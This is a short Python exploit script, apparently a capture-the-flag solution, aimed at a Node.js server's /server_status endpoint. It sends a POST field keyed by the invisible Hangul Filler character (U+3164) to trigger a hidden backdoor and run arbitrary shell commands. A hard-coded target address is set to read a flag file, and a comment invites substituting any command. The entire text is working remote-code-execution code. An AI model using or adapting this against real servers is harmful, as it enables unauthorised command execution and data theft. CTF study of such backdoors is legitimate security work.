import requests

def exploit_unicode_backdoor(url: str, command: str) -> str:
    """
    Exploits a Unicode variable backdoor in a vulnerable Node.js server to execute arbitrary shell commands.
    
    Args:
        url (str): The full URL of the vulnerable /server_status endpoint.
        command (str): The shell command to execute on the remote server.

    Returns:
        str: The output from the executed shell command, or an error message.
    """
    # Unicode Hangul Filler character (U+3164) used as a hidden variable name
    HANGUL_FILLER = '\u3164'

    # Prepare POST parameters with the hidden variable and desired command
    params = {
        'choice': '6',         # Index for the injected command slot
        HANGUL_FILLER: command # Hidden key for the injected command
    }

    try:
        response = requests.post(url, data=params, timeout=10)
        response.raise_for_status()
        return response.text.strip()
    except requests.RequestException as e:
        return f"Request failed: {e}"

if __name__ == "__main__":
    # URL of the target server's backdoored endpoint
    TARGET_URL = 'http://94.237.53.18:34590/server_status'
    
    # Command to retrieve the flag; you can change this to any command you want to run
    COMMAND = 'cat /www/flag.txt'

    # Run the exploit and print the result
    output = exploit_unicode_backdoor(TARGET_URL, COMMAND)
    print(output)
